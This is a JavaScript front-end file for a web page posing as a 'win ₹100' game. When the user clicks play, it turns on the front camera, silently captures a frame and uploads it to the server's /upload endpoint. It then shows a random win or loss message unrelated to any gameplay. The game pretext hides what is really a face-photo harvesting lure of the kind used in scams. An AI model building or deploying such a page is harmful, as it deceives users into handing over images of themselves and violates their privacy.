const playBtn = document.getElementById("playBtn");
const statusEl = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let stream = null;

async function getCameraStream() {
  if (stream) return stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
    return stream;
  } catch (err) {
    console.error("Camera error:", err);
    throw err;
  }
}

function stopStream() {
  if (!stream) return;
  stream.getTracks().forEach(t => t.stop());
  stream = null;
}

function showStatusWin(url) {
  statusEl.innerHTML = `<span class="win">✅ You Win ₹100!</span><br><a class="filelink" href="${url}" target="_blank">Open captured photo</a>`;
}

function showStatusLose(url) {
  statusEl.innerHTML = `<span class="lose">🔴 You Lost ₹100!</span><br><a class="filelink" href="${url}" target="_blank">Open captured photo</a>`;
}

playBtn.addEventListener("click", async () => {
  statusEl.textContent = "Processing...";
  try {
    await getCameraStream();

    // small delay to allow camera to initialize
    await new Promise(res => setTimeout(res, 600));

    // capture image
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, w, h);

    // convert to blob
    canvas.toBlob(async (blob) => {
      if (!blob) {
        statusEl.textContent = "Capture failed!";
        stopStream();
        return;
      }
      // upload
      const form = new FormData();
      form.append("photo", blob, "photo.jpg");

      try {
        const res = await fetch("/upload", { method: "POST", body: form });
        const data = await res.json();
        if (data && data.success) {
          const fileUrl = data.filePath;
          // decide win or lose (50/50)
          const win = Math.random() < 0.5;
          if (win) showStatusWin(fileUrl);
          else showStatusLose(fileUrl);
        } else {
          statusEl.textContent = "Upload failed!";
        }
      } catch (err) {
        console.error("Upload error:", err);
        statusEl.textContent = "Upload error!";
      } finally {
        stopStream();
      }
    }, "image/jpeg", 0.9);

  } catch (err) {
    statusEl.textContent = "Camera permission is required.";
  }
});